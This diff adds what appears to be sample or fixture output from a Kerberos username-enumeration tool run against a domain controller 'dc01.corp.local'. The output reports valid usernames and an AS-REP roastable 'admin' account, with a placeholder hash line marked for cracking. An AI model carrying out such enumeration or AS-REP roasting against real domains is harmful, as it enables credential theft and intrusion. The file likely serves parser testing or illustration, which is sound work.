@@ -1,0 +1,7 @@
+2026/06/20 12:00:00 >  Using KDC(s):
+2026/06/20 12:00:00 >  	dc01.corp.local:88
+2026/06/20 12:00:01 >  [+] VALID USERNAME:	 admin@corp.local
+2026/06/20 12:00:01 >  [+] admin has no pre auth required. Dumping hash for cracking:
+$krb5asrep$23$admin@CORP.LOCAL:1a2b3c4d5e6f$deadbeef
+2026/06/20 12:00:02 >  [+] VALID USERNAME:	 jsmith@corp.local
+2026/06/20 12:00:03 >  Done! Tested 100 usernames
